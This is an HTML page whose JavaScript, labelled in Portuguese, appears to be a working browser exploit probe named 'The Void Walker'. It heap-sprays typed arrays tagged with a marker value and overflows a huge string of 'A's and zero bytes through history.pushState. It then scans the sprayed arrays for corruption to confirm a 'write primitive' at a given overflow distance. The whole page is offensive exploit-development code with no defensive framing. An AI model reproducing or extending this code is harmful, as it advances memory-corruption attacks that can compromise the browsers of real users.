<!DOCTYPE html>
<html>
<head>
    <title>The Void Walker: Gap Hunter</title>
    <style>
        body { background: #000; color: #aaa; font-family: monospace; padding: 20px; }
        .log { border: 1px solid #444; height: 350px; overflow-y: scroll; padding: 10px; background: #111; color: #fff; margin-bottom: 15px;}
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        button { 
            padding: 20px; font-weight: bold; cursor: pointer; 
            background: #222; color: #fff; border: 1px solid #555; 
            font-size: 18px; 
        }
        button:hover { background: #fff; color: #000; }
        .found { background: #0f0; color: #000; }
    </style>
</head>
<body>
    <h1>THE VOID WALKER</h1>
    <p>Base: 709518 | Payload: ZEROS (0x00)</p>
    <p>Objetivo: Atravessar o padding até encontrar o vizinho.</p>

    <div id="logger" class="log">Escolha a distância...</div>

    <div class="grid">
        <button onclick="runWalker(64)">64 Bytes</button>
        <button onclick="runWalker(128)">128 Bytes</button>
        <button onclick="runWalker(256)">256 Bytes</button>
        <button onclick="runWalker(512)">512 Bytes</button>
        <button onclick="runWalker(1024)">1024 Bytes (1KB)</button>
        <button onclick="runWalker(2048)">2048 Bytes (2KB)</button>
    </div>

    <script>
        const logger = document.getElementById('logger');
        const BASE_SIZE = 709518; 
        const MAGIC_NUM = 0x41414141;
        const SPRAY_SIZE = 8000;

        var spray = [];

        function log(msg, type) {
            const d = document.createElement('div');
            d.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
            if(type) d.style.color = type;
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        async function runWalker(overflowSize) {
            log("---------------------------------------");
            log(`INUNDANDO: ${overflowSize} Bytes de ZEROS...`);
            
            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 200));
            spray = [];

            // Spray Contíguo (Muralha)
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024);
                arr[0] = MAGIC_NUM; 
                arr[1] = i; 
                spray.push(arr);
            }

            log("Aguardando estabilização...");
            await new Promise(r => setTimeout(r, 800));

            try {
                let base = new Array(BASE_SIZE + 1).join('A');
                // Criar overflow de zeros puro
                let overflow = new Array(overflowSize + 1).join('\x00');
                
                let payload = base + overflow;

                history.pushState({}, "pwn_" + overflowSize + "_" + Date.now(), payload);
                
                checkCorruption(overflowSize);

            } catch(e) {
                log("ERRO: " + e.message, "red");
            }
        }

        function checkCorruption(size) {
            let found = false;
            // Checa de trás pra frente
            for(let i = spray.length - 1; i >= 0; i--) {
                let arr = spray[i];
                if(arr) {
                    // 1. CHECAGEM DE LENGTH (Se virar 0 ou mudar)
                    if(arr.length !== 1024) {
                        found = true;
                        document.body.style.background = "#0f0";
                        alert(`CONTATO CONFIRMADO!\nDistância: ${size} bytes\nIndex: ${i}\nLength: ${arr.length}`);
                        return;
                    }

                    // 2. CHECAGEM DE DADOS (Se arr[0] virar 0)
                    if(arr[0] !== MAGIC_NUM) {
                        found = true;
                        log(`ALVO ATINGIDO no Index ${i}!`, "#0f0");
                        log(`Magic Number apagado (Valor: ${arr[0]}).`, "#0f0");
                        alert(`WRITE PRIMITIVE FOUND!\nOs zeros atingiram os dados!\nUse ${size} bytes.`);
                        return;
                    }
                }
            }
            if(!found) log(`Distância ${size}: Ainda no vazio (Padding). Aumente a carga.`);
        }
    </script>
</body>
</html>
